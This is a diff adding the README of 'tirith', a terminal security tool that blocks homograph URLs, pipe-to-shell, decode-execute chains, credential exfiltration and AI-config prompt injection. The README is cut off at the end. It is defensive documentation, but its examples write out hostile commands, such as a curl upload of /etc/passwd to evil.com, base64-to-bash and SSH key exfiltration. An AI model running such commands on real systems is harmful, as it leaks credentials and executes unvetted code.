@@ -1,0 +1,855 @@
+# tirith
+
+**Your browser would catch this. Your terminal won't.**
+
+<p align="center">
+  <img src="assets/cover.png" alt="tirith — terminal security" width="100%" />
+</p>
+
+[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
+[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)
+[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)
+
+[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [SKILL.md](SKILL.md) | [Changelog](https://github.com/sheeki03/tirith/releases)
+
+---
+
+Can you spot the difference?
+
+```
+  curl -sSL https://install.example-cli.dev | bash     # safe
+  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
+```
+
+You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.
+
+Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question. AI agents run shell commands and install packages without inspecting what's inside.
+
+**Tirith stands at the gate.** It intercepts commands, pasted content, and scanned files for homograph URLs, obfuscated payloads, credential exfiltration, malicious AI skills/configs, and known-bad packages/domains/IPs from a signed threat intelligence database before they execute.
+
+```bash
+brew install sheeki03/tap/tirith
+```
+
+Then activate in your shell profile:
+
+```bash
+# zsh
+eval "$(tirith init --shell zsh)"
+
+# bash
+eval "$(tirith init --shell bash)"
+
+# fish
+tirith init --shell fish | source
+```
+
+> [!TIP]
+> `eval "$(tirith init)"` auto-detects your current shell (it inspects the parent process and falls back to `$SHELL` if needed). The explicit `--shell` flag is only required when you want to override the detection.
+
+That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.
+
+Also available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).
+
+---
+
+## See it work
+
+**Homograph attack — blocked before execution:**
+
+```
+$ curl -sSL https://іnstall.example-clі.dev | bash
+
+tirith: BLOCKED
+  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
+    This is a homograph attack. The URL visually mimics a legitimate
+    domain but resolves to a completely different server.
+  Bypass: prefix your command with TIRITH=0 (applies to that command only)
+```
+
+The command never executes.
+
+**Pipe-to-shell with clean URL — warned, not blocked:**
+
+```
+$ curl -fsSL https://get.docker.com | sh
+
+tirith: WARNING
+  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
+    Consider downloading first and reviewing.
+```
+
+Warning prints to stderr. Command still runs.
+
+**Base64 decode-execute chain — blocked:**
+
+```
+$ echo payload | base64 -d | bash
+
+tirith: BLOCKED
+  [HIGH] base64_decode_execute — Base64 decode piped to interpreter
+  [HIGH] pipe_to_interpreter — Pipe to interpreter: base64 | bash
+```
+
+Catches decode chains through sudo/env wrappers and PowerShell `-EncodedCommand` too.
+
+**Credential exfiltration — blocked:**
+
+```
+$ curl -d @/etc/passwd https://evil.com/collect
+
+tirith: BLOCKED
+  [HIGH] data_exfiltration — Data exfiltration via curl upload
+    curl command uploads sensitive data to a remote server
+```
+
+Covers all curl/wget upload flags, env vars (`$AWS_SECRET_ACCESS_KEY`), and command substitution.
+
+**Malicious skill file — caught on scan:**
+
+```
+$ tirith scan evil_skill.py
+
+tirith scan: evil_skill.py — 3 finding(s)
+  [MEDIUM] dynamic_code_execution — exec() near b64decode() in close proximity
+  [MEDIUM] obfuscated_payload — Long base64 string decoded and executed
+  [MEDIUM] suspicious_code_exfiltration — HTTP call passes sensitive data as argument
+```
+
+Scans JS/Python files for obfuscated payloads, dynamic code execution, and secret exfiltration patterns.
+
+**Normal commands — invisible:**
+
+```
+$ git status
+$ ls -la
+$ docker compose up -d
+```
+
+Nothing. Zero output. You forget tirith is running.
+
+---
+
+## What it catches
+
+**80+ detection rules across 15 categories.**
+
+| Category | What it stops |
+|----------|--------------|
+| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains, text-level confusable detection (math alphanumerics, same-word mixed-script) |
+| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors, Hangul fillers |
+| **Steganography defense** | Invisible whitespace encoding (12 Unicode space variants), Mongolian Vowel Separator, Hangul Filler characters, math alphanumeric substitution — defenses against st3gg-style text steganography |
+| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `httpie \| sh`, `xh \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
+| **Base64 decode-execute** | `base64 -d \| bash`, `python -c "exec(b64decode(...))"`, `powershell -EncodedCommand` — decode chains through sudo/env wrappers |
+| **Data exfiltration** | `curl -d @/etc/passwd`, `curl -T ~/.ssh/id_rsa`, `wget --post-file`, env var uploads (`$AWS_SECRET_ACCESS_KEY`), command substitution exfil |
+| **Code file scanning** | Obfuscated payloads (`eval(atob(...))`), dynamic code execution (`exec(b64decode(...))`), secret exfiltration via `fetch`/`requests.post` in JS/Python files |
+| **Credential detection** | AWS keys, GitHub PATs, Stripe/Slack/SendGrid/Anthropic/GCP/npm tokens, private key blocks, plus entropy-based generic secret detection |
+| **Post-compromise behavior** | Process memory scraping (`/proc/*/mem`), Docker remote privilege escalation, credential file sweeps — calibrated against TeamPCP and UNC1069 post-compromise tooling |
+| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |
+| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |
+| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |
+| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |
+| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |
+| **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |
+| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, comment content analysis (prompt injection at High, destructive commands at Medium) |
+| **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |
+
+---
+
+## What tirith does NOT protect against
+
+Tirith analyzes the **structure** of commands, pasted text, and files *before*
+they execute. It is a pre-execution gate, not a runtime defense. By design, it
+does not cover:
+
+- **Runtime sandboxing** — tirith does not sandbox or contain a command once it
+  runs. It decides whether to warn or block; it does not isolate execution.
+- **Post-execution network monitoring** — tirith does not inspect network
+  traffic after a command runs. What a process does on the network once
+  launched is out of scope.
+- **Malware / payload detection** — tirith analyzes command and file
+  *structure*, not payload behavior. It is not an antivirus and does not
+  detonate or signature-match payloads. (`tirith run` analyzes a downloaded
+  script's structure before execution, but it is still not malware analysis.)
+- **A privileged root/admin attacker** — a user who is already root or admin can
+  bypass tirith trivially. Tirith defends against tricked input, not against an
+  attacker who already owns the machine.
+- **Anti-debugging / anti-tampering** — tirith does not resist analysis or
+  reverse engineering, and does not protect its own binary from a local
+  attacker.
+
+See [docs/threat-model.md](docs/threat-model.md) for the full threat model and
+explicit non-goals.
+
+---
+
+## Known limitations
+
+- **Shell-hook fragility** — tirith protection depends on a shell hook staying
+  correctly installed and active. Hooks can break or silently degrade across
+  shells (zsh, bash, fish, PowerShell), shell versions, prompt frameworks, and
+  history tools. Run `tirith doctor` to check live hook state, and watch for
+  warn-only degradation messages.
+- **Unix-only features** — daemon mode and `tirith setup` are Unix-only today.
+  `tirith run` and `tirith fetch` are likewise Unix-only.
+- **Package-name extraction scope** — package-name matching against the threat
+  database covers language ecosystems (pip, npm/yarn/pnpm/bun, cargo, gem, go,
+  composer, dotnet, mvn/gradle). It does **not** cover distro-level package
+  managers (`apt`, `dnf`, `yum`, `pacman`).
+- **AI-agent integration caveats** — shell-hook interception only guards
+  commands that actually go through a hooked interactive shell; an agent that
+  spawns a non-interactive shell, calls `exec` directly, or runs in an
+  environment where the hook is not loaded is not covered. MCP-based protection
+  requires the agent to actually call the tirith MCP tools — it is advisory, not
+  enforced.
+
+---
+
+## Threat intelligence
+
+Tirith ships a signed local threat database for package, hostname, and IP reputation. When a shell hook or `tirith check` sees a package install or suspicious infrastructure reference, it matches that input against the database before the command executes, instead of relying only on static heuristics.
+
+**Signed DB** (built daily by CI, verified on download and load):
+
+- Known-malicious packages from [OpenSSF Malicious Packages](https://github.com/ossf/malicious-packages) and [Datadog Security Labs](https://github.com/DataDog/malicious-software-packages-dataset)
+- Malicious IP infrastructure from [Feodo Tracker](https://feodotracker.abuse.ch/) (abuse.ch)
+- Confirmed typosquats and popular-package baselines from [ecosyste.ms](https://ecosyste.ms/)
+- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) catalog for runtime advisory correlation
+
+**Optional supplemental feeds** (user-local overlay):
+
+- [URLhaus](https://urlhaus.abuse.ch/) and [ThreatFox](https://threatfox.abuse.ch/) via an abuse.ch auth key
+- [PhishTank](https://phishtank.org/) (Cisco Talos) and [Phishing Army](https://phishing.army/) blocklists
+- Tor exit node list from [Tor Project](https://www.torproject.org/)
+
+**Optional live enrichment** during `tirith check` and daemon mode:
+
+- [OSV.dev](https://osv.dev/) advisory lookups (Google OSS)
+- [deps.dev](https://deps.dev/) package health signals (Google OSS) and [ecosyste.ms](https://ecosyste.ms/) maintainer data
+- [Google Safe Browsing](https://safebrowsing.google.com/) URL reputation with your own API key
+
+```bash
+tirith threat-db update              # download + verify the signed DB
+tirith threat-db status              # age, signature, version, entry counts
+tirith threat-db health              # install, signature, staleness, counts
+tirith threat-db sources             # list every feed the DB is built from
+tirith threat-db explain react       # what the DB knows about an indicator
+tirith threat-db diff --since 2026-01-01   # count changes since a version/date
+```
+
+By default, shell hooks and `tirith check` trigger a cheap background refresh check every 24 hours. Daemon mode keeps the same enrichment path warm in the background.
+
+`threat-db explain` accepts a domain, a package name (`name`, `ecosystem:name`, or `name@version`), or an IPv4 address; `threat-db sources` groups feeds into the signed primary database and the optional user-local supplemental overlay. The threat-DB binary retains no per-entry history, so `threat-db diff` reports category and per-source count deltas between snapshots rather than the exact entries added or removed. Every `threat-db` command takes `--format json`; `threatdb` works as an alias for `threat-db`.
+
+This helps catch known-malicious packages, confirmed typosquats, slopsquatted package names, malicious download infrastructure, and packages with live OSV / CISA KEV advisory data.
+
+**Attack families tirith is built for** (illustrative, not a caught-by-current-code claim):
+
+| Incident | Year | Attack shape |
+|---|---|---|
+| [Shai-Hulud npm worm](https://socket.dev/blog/shai-hulud-worm) | 2025 | Self-propagating package malware; exfiltrated GitHub tokens and AWS keys from 180+ packages, published findings to public `Shai-Hulud` repos |
+| [Slopsquatting](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks) | 2023–ongoing | Attackers register LLM-hallucinated package names on npm / PyPI / crates.io; [USENIX 2025](https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-742-spracklen.pdf) found 58% of hallucinated names repeat across runs |
+| Team PCP / UNC1069 tooling | ongoing | Post-compromise credential sweeps, `/proc/*/mem` scraping, Docker privilege escalation |
+| [colors.js / faker.js sabotage](https://snyk.io/blog/open-source-npm-packages-colors-faker/) | 2022 | Author self-sabotage of widely-used packages |
+| [event-stream compromise](https://github.com/dominictarr/event-stream/issues/116) | 2018 | Transferred ownership to attacker; payload targeted Bitcoin wallets |
+
+Package-name extraction currently covers language ecosystems (pip, npm/yarn/pnpm/bun, cargo, gem, go, composer, dotnet, mvn/gradle), not distro-level package managers (`apt` / `dnf` / `yum` / `pacman`). That's why xz-utils, which entered through Linux distro tarballs, is not in the table despite being a headline incident.
+
+---
+
+## AI agent security
+
+Tirith protects AI coding agents at every layer — from the configs they read to the commands they execute.
+
+### Shell hooks — passive command interception
+
+When AI agents execute shell commands (Claude Code, Codex, Cursor, etc.), tirith's shell hooks intercept every command before it runs. No agent-side configuration needed — if the hook is active in the shell, all commands are guarded:
+
+- **Blocks dangerous commands** — homograph URLs, pipe-to-shell, insecure downloads
+- **Blocks malicious paste** — ANSI injection, bidi attacks, hidden multiline in pasted content
+- **Works with every agent** — any tool that spawns a shell inherits tirith protection
+- **Zero agent modification** — the agent doesn't know tirith exists until a command is blocked
+
+Use `tirith setup <tool>` for one-command configuration (see [AI Agent Integrations](#ai-agent-integrations)).
+
+### MCP server (7 tools)
+
+Run `tirith mcp-server` or use `tirith setup <tool> --with-mcp` to register tirith as an MCP server. AI agents can call these tools before taking action:
+
+| Tool | What it does |
+|------|-------------|
+| `tirith_check_command` | Analyze shell commands for pipe-to-shell, homograph URLs, env injection |
+| `tirith_check_url` | Score URLs for homograph attacks, punycode tricks, shortened URLs, raw IPs |
+| `tirith_check_paste` | Check pasted content for ANSI escapes, bidi controls, zero-width chars |
+| `tirith_scan_file` | Scan a file for hidden content, invisible Unicode, config poisoning |
+| `tirith_scan_directory` | Recursive scan with AI config file prioritization |
+| `tirith_verify_mcp_config` | Validate MCP configs for insecure servers, shell injection in args, wildcard tools |
+| `tirith_fetch_cloaking` | Detect server-side cloaking (different content for bots vs browsers) |
+
+### Config file scanning
+
+`tirith scan` detects prompt injection and hidden payloads in AI config files. It prioritizes and scans 50+ known AI config file patterns:
+
+- `.cursorrules`, `.windsurfrules`, `.clinerules`, `CLAUDE.md`, `copilot-instructions.md`
+- `.claude/` settings, agents, skills, plugins, rules
+- `.cursor/`, `.vscode/`, `.windsurf/`, `.cline/`, `.continue/`, `.roo/`, `.codex/` configs
+- `mcp.json`, `.mcp.json`, `mcp_settings.json`
+- `.github/copilot-instructions.md`, `.github/agents/*.md`
+
+**What it catches in configs:**
+
+- **Prompt injection** — skill activation triggers, permission bypass attempts, safety dismissal, identity reassignment, cross-tool override instructions
+- **Invisible Unicode** — zero-width characters (including Mongolian Vowel Separator), bidi controls, soft hyphens, Unicode tags, Hangul fillers, invisible whitespace encoding, math alphanumeric confusables
+- **MCP config issues** — insecure HTTP connections, raw IP servers, shell metacharacters in args, duplicate server names, wildcard tool access
+
+### Hidden content detection
+
+Detects content invisible to humans but readable by AI in HTML, Markdown, and PDF:
+
+- **CSS hiding** — `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, off-screen positioning
+- **Color hiding** — white-on-white text, similar foreground/background (contrast ratio < 1.5:1)
+- **HTML/Markdown comments** — prompt injection phrases (High), destructive commands like `rm -rf` or `curl|bash` (Medium), long comments hiding instructions (Low)
+- **PDF hidden text** — sub-pixel rendered text (font-size < 1px) invisible to readers but parseable by LLMs
+
+### Cloaking detection
+
+`tirith fetch` compares server responses across 6 user-agents (Chrome, ClaudeBot, ChatGPT-User, PerplexityBot, Googlebot, curl) to detect when servers serve different content to AI bots vs browsers.
+
+---
+
+## Install
+
+### macOS
+
+**Homebrew:**
+
+```bash
+brew install sheeki03/tap/tirith
+```
+
+### Linux Packages
+
+**Debian / Ubuntu (.deb):**
+
+Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:
+
+```bash
+sudo dpkg -i tirith_*_amd64.deb
+```
+
+**Fedora / RHEL / CentOS 9+ (.rpm):**
+
+Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:
+
+```bash
+sudo dnf install ./tirith-*.rpm
+```
+
+**Arch Linux (AUR):**
+
+```bash
+yay -S tirith
+# or: paru -S tirith
+```
+
+**Nix:**
+
+```bash
+nix profile install nixpkgs#tirith              # from nixpkgs
+nix profile install github:sheeki03/tirith      # from upstream flake
+# or try without installing: nix run github:sheeki03/tirith -- --version
+```
+
+### Android (Termux)
+
+Android/Termux runs on Bionic libc, not glibc, so the `aarch64-unknown-linux-gnu`
+build cannot run there — it needs glibc's dynamic linker. Use the **musl** build
+instead: `tirith-aarch64-unknown-linux-musl.tar.gz` is statically linked and runs
+on Termux without an external libc.
+
+```bash
+# In Termux:
+pkg install curl tar
+# Download the musl build from the latest GitHub release:
+curl -fsSL -o tirith.tar.gz \
+  https://github.com/sheeki03/tirith/releases/latest/download/tirith-aarch64-unknown-linux-musl.tar.gz
+tar xzf tirith.tar.gz
+install -Dm755 tirith "$PREFIX/bin/tirith"
+tirith --version
+```
+
+Then activate the shell hook in `~/.bashrc` (Termux's default shell is bash):
+
+```bash
+eval "$(tirith init --shell bash)"   # add to ~/.bashrc
+```
+
+> [!NOTE]
+> Termux support is best-effort. The musl artifact is built and smoke-tested in
+> CI, but tirith is not yet continuously tested on a real Android device.
+> If a hook misbehaves under Termux, please open an issue with `tirith doctor`
+> output.
+
+### Windows
+
+All core features work on Windows including detection, scanning, webhooks, policy management, and audit uploads. Shell hooks support PowerShell. Daemon mode and `tirith setup` are Unix-only for now.
+
+**Scoop:**
+
+```powershell
+scoop bucket add tirith https://github.com/sheeki03/scoop-tirith
+scoop install tirith
+```
+
+**Chocolatey** (under moderation — pending approval):
+
+```powershell
+choco install tirith
+```
+
+### Cross-Platform
+
+**npm:**
+
+```bash
+npm install -g tirith
+```
+
+**Cargo:**
+
+```bash
+cargo install tirith
+```
+
+**[Mise](https://mise.jdx.dev/)** (official registry):
+
+```bash
+mise use -g tirith
+```
+
+**asdf:**
+
+```bash
+asdf plugin add tirith https://github.com/sheeki03/asdf-tirith.git
+asdf install tirith latest
+asdf global tirith latest
+```
+
+**Docker:**
+
+```bash
+docker run --rm ghcr.io/sheeki03/tirith check -- "curl https://example.com | bash"
+```
+
+### Activate
+
+Add to your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):
+
+```bash
+eval "$(tirith init --shell zsh)"   # in ~/.zshrc
+eval "$(tirith init --shell bash)"  # in ~/.bashrc
+tirith init --shell fish | source   # in ~/.config/fish/config.fish
+```
+
+| Shell | Hook type | Tested on |
+|-------|-----------|-----------|
+| zsh | preexec + paste widget | 5.8+ |
+| bash | preexec (two modes) | 5.0+ |
+| fish | fish_preexec event | 3.5+ |
+| PowerShell | PSReadLine handler | 7.0+ |
+
+Bash uses enter mode when a capability self-test has proven it works for your bash, and preexec otherwise. `tirith setup` / `tirith doctor` run the self-test; the shell hook reads its cached verdict at startup. See [troubleshooting](docs/troubleshooting.md#bash-enter-mode-vs-preexec-mode) for details on the modes, the self-test, and SSH fallback behavior.
+
+> [!WARNING]
+> Bash's preexec mode warns but cannot block in-place. Set `TIRITH_BASH_PREEXEC_ENFORCE=1` for real blocking via `shopt -s extdebug`. Enforcement refuses to activate when `HISTCONTROL` contains `ignorespace` / `ignoredups` / `ignoreboth`, any `HISTIGNORE` is set, or `set +o history` is active — those make the block racy.
+
+#### Enforcement by shell
+
+| Shell | Behavior |
+|---|---|
+| bash **enter mode** | **Reliable blocking.** Binds Enter; can stop a command before bash commits to running it. Used by default only where a capability self-test (`tirith doctor --simulate-enter`) has proven `bind -x` delivery works for the running bash. |
+| bash **preexec + `TIRITH_BASH_PREEXEC_ENFORCE=1`** | **Conditional blocking.** Uses `shopt -s extdebug`; blocks when bash's `history` can provide a trustworthy whole-line view. Downgrades to warn-only when history is filtered (`HISTCONTROL=ignorespace/ignoredups/ignoreboth`, any `HISTIGNORE`, or `set +o history`) or an alias / command substitution / `eval` makes the typed line drift from `BASH_COMMAND`. |
+| bash **preexec** (no enforce flag) | Warn-only. Prints a DETECTED banner on risky commands; does not block. The fallback when the enter-mode self-test has not proven delivery works. |
+| zsh, fish, powershell | Reliable blocking via native preexec hooks. |
+| nushell | Warn-only (does not currently support command interception). |
+
+For guaranteed line-level blocking on bash, run `tirith doctor --simulate-enter` — if delivery works, enter mode is enabled. Where it does not, use preexec enforce for "blocks when possible; tells you honestly when it can't."
+
+**Nix / Home-Manager:** tirith must be in your `$PATH` — the shell hooks call `tirith` by name at runtime. Adding it to `initContent` alone is not enough.
+
+```nix
+home.packages = [ pkgs.tirith ];
+
+programs.zsh.initContent = ''
+  eval "$(tirith init --shell zsh)"
+'';
+```
+
+### Updating and verifying tirith
+
+tirith can verify its own integrity and update itself. Both commands reach the network only when you run them.
+
+```bash
+tirith verify-self          # is this binary the genuine, unmodified release?
+tirith update               # update to the latest release
+tirith version --provenance # version, build info, install method, verification
+```
+
+**`tirith verify-self`** confirms the running binary is the genuine, unmodified binary from an official release. It re-downloads the release archive for your version and target, verifies it against the signed release `checksums.txt`, verifies the cosign signature over `checksums.txt` when [`cosign`](https://github.com/sigstore/cosign) is installed, and confirms the running binary is byte-identical to the official one. If full verification is not possible — a local dev build, no network, an install tirith cannot identify — it says so honestly rather than reporting a false "verified". With `cosign` absent the checksum is still verified (reported as `verified-checksum-only`); install `cosign` for full signature verification (`verified-signed`).
+
+**`tirith update`** is package-manager-aware:
+
+- **Package-manager installs** (Homebrew, cargo, npm, Scoop, AUR, apt/dnf) are never self-modified. tirith prints the exact command to run instead — e.g. `brew upgrade tirith`. Updating through the package manager keeps its database consistent.
+- **Self-managed installs** (the `install.sh` tarball, or a standalone binary) are updated in place: tirith downloads the latest release, verifies it, then atomically swaps the binary, keeping the previous one as a `tirith.tirith-previous` sidecar. `--verify` makes a verified cosign signature mandatory; a checksum mismatch always aborts. `tirith update --rollback` reverts to the previous binary; `--dry-run` shows what would happen without changing anything.
+
+### Shell Integrations
+
+**Oh-My-Zsh:**
+
+```bash
+git clone https://github.com/sheeki03/ohmyzsh-tirith \
+  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/tirith
+
+# Add tirith to plugins in ~/.zshrc:
+plugins=(... tirith)
+```
+
+### AI Agent Integrations
+
+Use `tirith setup <tool>` for one-command configuration:
+
+```bash
+tirith setup claude-code --with-mcp   # Claude Code + MCP server
+tirith setup codex                    # OpenAI Codex
+tirith setup copilot-cli              # GitHub Copilot CLI (run from repo root)
+tirith setup cursor                   # Cursor
+tirith setup gemini-cli --with-mcp    # Gemini CLI + MCP server
+tirith setup kiro                     # Kiro CLI (formerly Amazon Q)
+tirith setup pi-cli                   # Pi CLI
+tirith setup vscode                   # VS Code
+tirith setup windsurf                 # Windsurf
+```
+
+For manual configuration, see `mcp/clients/` for per-tool guides.
+
+### CI/CD Integration
+
+**GitHub Action** with SARIF upload to GitHub Security tab:
+
+```yaml
+- uses: sheeki03/tirith@v1
+  with:
+    fail_on: high
+    sarif: true
+```
+
+Also available as a **pre-commit hook** — see `.pre-commit-hooks.yaml` in this repo.
+
+Scan supports `--include`, `--exclude`, `--profile` (loads named profiles from policy), and `--ignore` filters for targeted CI scanning.
+
+### Rule Documentation
+
+```bash
+tirith explain --rule pipe_to_interpreter   # severity, examples, remediation, MITRE ATT&CK
+tirith explain --rule curl_pipe_shell --fix # just the remediation ("what to do instead")
+tirith explain --list --category terminal   # all rules in a category
+```
+
+### Remediation — "what to run instead"
+
+Every finding carries a per-rule remediation: a short, accurate "how to make
+this safe" line, shown under each finding (`Fix:`) and in `--format json`.
+`tirith explain --rule <id> --fix` prints that remediation on its own.
+
+When a command is blocked or warned, `tirith check --suggest-safe-command`
+additionally prints a concrete safer rewrite of the *actual* command — but only
+where a transformation is genuinely safer and correct:
+
+```bash
+tirith check --suggest-safe-command -- 'curl https://example-cli.dev/i.sh | bash'
+# → try: curl -fsSL -o /tmp/tirith-review.sh https://example-cli.dev/i.sh \
+#        && less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh
+```
+
+It rewrites pipe-to-shell into download-review-run, drops insecure-TLS flags
+(`-k` / `--insecure` / `--no-check-certificate`), and switches plain `http://`
+to `https://`. For findings with no safe mechanical rewrite (homograph
+hostnames, archive-extract targets, …) it says so plainly and shows the
+remediation instead — it never emits a bogus suggestion. The flag is advisory:
+it changes neither the verdict nor the exit code.
+
+### Daemon Mode (Unix)
+
+Optional background process for sub-millisecond latency and network-aware enrichment (shortened URL resolution, DNS blocklist checks):
+
+```bash
+tirith daemon start       # tirith check auto-delegates when running
+tirith daemon stop
+```
+
+> [!NOTE]
+> Daemon mode is Unix-only today.
+
+---
+
+## Commands
+
+| Command | What it does |
+|---------|-------------|
+| `tirith check -- <cmd>` | Analyze a command without executing it (`--suggest-safe-command` adds a concrete safer rewrite) |
+| `tirith paste` | Check pasted content (called automatically by shell hooks) |
+| `tirith scan [path]` | Scan files/directories with `--include`, `--exclude`, `--profile`, `--format sarif`, `--ci` |
+| `tirith threat-db update` | Download, verify, and install the signed threat database |
+| `tirith threat-db status` | Show DB age, signature status, version, and entry counts |
+| `tirith threat-db explain <indicator>` | Explain what the threat DB knows about a domain, package, or IP |
+| `tirith threat-db sources` | List the threat-intelligence sources the DB is built from |
+| `tirith threat-db health` | Report threat DB health: install, signature, staleness, entry counts |
+| `tirith threat-db diff --since <ver\|date>` | Summarize threat-DB count changes since a version or date |
+| `tirith explain --rule <id>` | Show documentation, examples, and remediation for any detection rule (`--fix` shows just the remediation) |
+| `tirith policy init` | Generate a starter `.tirith/policy.yaml` (`--template individual\|ci-strict\|ai-agent-heavy` for curated presets) |
+| `tirith policy validate` | Validate policy YAML for syntax, schema, and conflicts |
+| `tirith policy test <cmd>` | Dry-run a command or file against your policy with match trace |
+| `tirith policy tune --from-audit` | Suggest conservative policy adjustments from your audit log (suggest-only — never edits the policy) |
+| `tirith run <url>` | Safe `curl \| bash` replacement. Downloads, analyzes, reviews, then executes |
+| `tirith score <url>` | Break down a URL's trust signals (`--explain` shows the deterministic factor-by-factor score derivation) |
+| `tirith diff <url>` | Byte-level comparison showing where suspicious characters hide |
+| `tirith fetch <url>` | Detect server-side cloaking (different content for bots vs browsers) |
+| `tirith why` | Explain the last rule that triggered |
+| `tirith doctor` | Diagnose installation, hooks, and policy |
+| `tirith doctor --fix` | Auto-fix detected issues (hooks, policy, AI tool setup) |
+| `tirith doctor --compat` | Shell/terminal compatibility report (detected shell, bash mode, install checks, co-installed hook-interacting tools) |
+| `tirith verify-self` | Verify the running binary is the genuine, unmodified official release (checksum + cosign signature); reports honestly when it cannot |
+| `tirith update` | Update tirith to the latest release — defers to your package manager for PM installs, atomic verified self-replace for `install.sh`/standalone installs (`--verify`, `--rollback`, `--dry-run`) |
+| `tirith version --provenance` | Show version, build info, detected install method, and verification status |
+| `tirith daemon start` | Start background daemon for faster checks (Unix) |
+| `tirith receipt {last,list,verify}` | Track and verify scripts run through `tirith run` |
+| `tirith checkpoint {create,restore,diff}` | Snapshot files before risky operations, roll back if needed |
+| `tirith setup <tool>` | One-command setup for AI coding tools (see [AI Agent Integrations](#ai-agent-integrations)) |
+| `tirith gateway run` | MCP gateway proxy for intercepting AI agent shell tool calls |
+| `tirith warnings` | Show accumulated session warnings, suggest trust entries. `--summary` for shell exit hooks |
+| `tirith trust {add,list,explain,diff,remove,gc}` | Manage trusted patterns: narrow scope and a 30-day TTL by default, scope visualization, `trust explain`, `trust diff` |
+| `tirith audit {export,stats,report}` | Audit log management for compliance |
+| `tirith init` | Print the shell hook for your shell profile |
+| `tirith mcp-server` | Run as MCP server over JSON-RPC stdio |
+
+---
+
+## Design principles
+
+- **Detection runs locally** — `paste`, `score`, `diff`, and `why` make zero
+  network calls; all of their analysis is local. `tirith check` (including the
+  `--approval-check` path that shell hooks use) also analyzes locally, but
+  before analysis it triggers a *periodic background threat-DB refresh check*
+  (see below) — so `check` is not strictly offline. Pass `tirith check
+  --offline` (or set `TIRITH_OFFLINE=1`) to suppress that refresh and keep
+  `check` fully local.
+- **Periodic background threat-DB refresh** — `tirith check` and the shell hooks
+  trigger a cheap background check, at most once every 24 hours by default
+  (`threat_intel.auto_update_hours`), to keep the signed threat database fresh.
+  The check is detached and does not block the command; set
+  `auto_update_hours: 0` in policy to disable it entirely, or pass
+  `tirith check --offline` / set `TIRITH_OFFLINE=1` to suppress it per
+  invocation. `tirith paste` does **not** trigger this — it goes straight
+  through the local engine.
+- **No command rewriting** — tirith never modifies what you typed.
+- **No telemetry** — no analytics, no crash reporting, no phone-home behavior.
+- **No long-lived background processes by default** — tirith is invoked
+  per-command and exits immediately. The threat-DB refresh above is a
+  short-lived detached update, not a resident process. Optional `tirith daemon
+  start` is the only resident process, and it is opt-in.
+- **Network only when you ask, configure it, or for the threat-DB refresh** —
+  `run`, `fetch`, and `audit report --upload` reach the network on explicit
+  invocation. The periodic threat-DB refresh check reaches the network on the
+  schedule above. Daemon mode adds network-aware URL resolution. Optional
+  webhook and policy-server integrations can also make outbound requests when
+  configured. Core detection itself does not phone home.
+
+---
+
+## Configuration
+
+### Quick start
+
+```bash
+tirith policy init          # creates .tirith/policy.yaml in your repo
+tirith policy validate      # check for syntax/schema errors
+tirith policy test "curl https://example.com | bash"  # dry-run against policy
+```
+
+`tirith policy init` accepts `--template <name>` for a curated starter policy:
+
+```bash
+tirith policy init --template individual      # solo developer defaults
+tirith policy init --template ci-strict       # fail-closed, no bypass, scan fail-on
+tirith policy init --template ai-agent-heavy  # tuned for heavy AI-agent use
+```
+
+Each template is a well-commented, schema-valid policy you can edit further.
+With no `--template`, `tirith policy init` writes the full default policy.
+
+### Policy file
+
+Tirith uses a YAML policy file. Discovery order:
+1. `.tirith/policy.yaml` in current directory (walks up to repo root)
+2. `~/.config/tirith/policy.yaml`
+
+```yaml
+fail_mode: open        # or "closed" for strict environments
+paranoia: 1            # 1-4: higher = more sensitive
+strict_warn: false     # require explicit acknowledgement for warnings
+
+allowlist:
+  - "get.docker.com"
+  - "sh.rustup.rs"
+
+blocklist:
+  - "evil.example.com"
+
+severity_overrides:
+  docker_untrusted_registry: CRITICAL
+
+scan:
+  ignore_patterns:
+    - "node_modules"
+    - "target"
+  profiles:
+    ci:
+      include: ["*.md", "*.json", "*.yaml", ".claude/*"]
+      fail_on: high
+```
+
+Use `allowlist_rules` for rule-scoped suppressions when you trust a source for one rule but do not want to globally allowlist it:
+
+```yaml
+allowlist_rules:
